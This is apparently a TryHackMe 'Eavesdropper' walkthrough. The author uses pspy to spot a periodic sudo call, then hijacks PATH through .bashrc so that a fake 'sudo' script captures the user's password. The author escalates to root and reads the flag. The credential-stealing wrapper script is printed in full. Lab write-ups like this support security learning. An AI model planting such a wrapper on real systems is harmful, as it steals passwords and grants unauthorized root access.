# **Eavesdropper-TryHackMe**





So, we are given a ssh key of frank, let's download and move forward.



Don't forget to change the permissions too.


'''bash
>>*chmod 600 id\_rsa*
'''

>>*ssh -i id\_rsa frank@10.49.136.220*



The authenticity of host '10.49.136.220 (10.49.136.220)' can't be established.

ED25519 key fingerprint is: SHA256:WaKDmh6WMRiZ/ysLM5UQM/UirbKKHGy+jRJ5euxQS84

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added '10.49.136.220' (ED25519) to the list of known hosts.

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86\_64)



&nbsp;\* Documentation:  https://help.ubuntu.com

&nbsp;\* Management:     https://landscape.canonical.com

&nbsp;\* Support:        https://ubuntu.com/advantage



This system has been minimized by removing packages and content that are

not required on a system that users do not log into.



To restore this content, you can run the 'unminimize' command.

Last login: Thu Jan 29 04:57:41 2026 from 172.18.0.3

frank@workstation:~$ 







I was thinking like we are in sudo group, it is going to be easy, but while checking it needs a password.



frank@workstation:~$ *id*

uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)



frank@workstation:~$ *sudo -l*

\[sudo] password for frank: 

frank@workstation:~$ 



So, I tried using Linpeas, but I couldnot find anything suspicious.



Although, sudo version is vulnerable, to exploit this I need make binary but, it is not available, so again back to loophole.





>>*sudo --version*



Sudo version 1.8.31

Sudoers policy plugin version 1.8.31

Sudoers file grammar version 46

Sudoers I/O plugin version 1.8.31





Since, the room tells s to listen explicitly, let's use pspy64 tool.



>>*./pspy64*





pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d





&nbsp;    ██▓███    ██████  ██▓███ ▓██   ██▓

&nbsp;   ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒

&nbsp;   ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░

&nbsp;   ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░

&nbsp;   ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░

&nbsp;   ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 

&nbsp;   ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 

&nbsp;   ░░       ░  ░  ░  ░░       ▒ ▒ ░░  

&nbsp;                  ░           ░ ░     

&nbsp;                              ░ ░     



Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: \[/usr /tmp /etc /home /var /opt] (recursive) | \[] (non-recursive)

Draining file system events due to startup...

done

2026/01/29 05:23:59 CMD: UID=1000  PID=15772  | ./pspy64 

2026/01/29 05:23:59 CMD: UID=1000  PID=9182   | xxd 

2026/01/29 05:23:59 CMD: UID=1000  PID=9181   | dd bs=9000 count=1 

.

.

.

.

.

.

.

2026/01/29 05:24:07 CMD: UID=1000  PID=15822  | 

2026/01/29 05:24:08 CMD: UID=1000  PID=15823  | 

2026/01/29 05:24:09 CMD: UID=1000  PID=15824  | sshd: frank@pts/1    

2026/01/29 05:24:09 CMD: UID=0     PID=15825  | sudo cat /etc/shadow 

^CExiting program... (interrupt)







notice this "sudo cat /etc/shadow". Root periodically runs sudo cat /etc/shadow, let's abuse this by changing the path.



First, let's make a tmp directory.



>>*mkdir /tmp/eavesdrop*



Make a malicious sudo script using:



frank@workstation:/tmp/eavesdrop$ *nano sudo*



frank@workstation:/tmp/eavesdrop$ *cat sudo*

\#!/bin/bash

read -s password

echo $password > /tmp/pass.txt

echo "$password" | /usr/bin/sudo -S "$@"

frank@workstation:/tmp/eavesdrop$ 





Make it executable.



>>*chmod +x sudo*



Add our created directory to path.



>>*export PATH="/tmp/eavesdrop:$PATH"*



Verify:



>>*echo $PATH*



/tmp/eavesdrop:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin





We can see that, our directory is in the first position of the path.

Let's wait for some time for cron job to run.





Unlucky for us, the path resets when the sudo runs.

So, let's try by editing our .bashrc file. Add a path in the .bashrc file.



>>*cat .bashrc | head*



\# ~/.bashrc: executed by bash(1) for non-login shells.

\# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)

\# for examples

export PATH=/home/frank/bin:$PATH

\# If not running interactively, don't do anything

case $- in

&nbsp;   \*i\*) ;;

&nbsp;     \*) return;;

esac





Let's make a new sudo file, slightly changing it.



>>*cat sudo*



\#!/bin/bash

read password

echo $password >> /home/frank/password.txt





Make it executable, and wait for some time.





We got a password.txt dropped.



>>*cat password.txt* 



**!@#...2%\***



Let's become root.



>>*sudo su*



\[sudo] password for frank: 



root@workstation:/home/frank# 





Boom, and we are root.

Let's head to /root and read the flag.





>>*cat flag.txt*



flag{14.....00}







With this we complete the room.





Time to complete: ~15 minutes

Difficulty: Medium

Key lesson: PATH variable manipulation can lead to credential theft


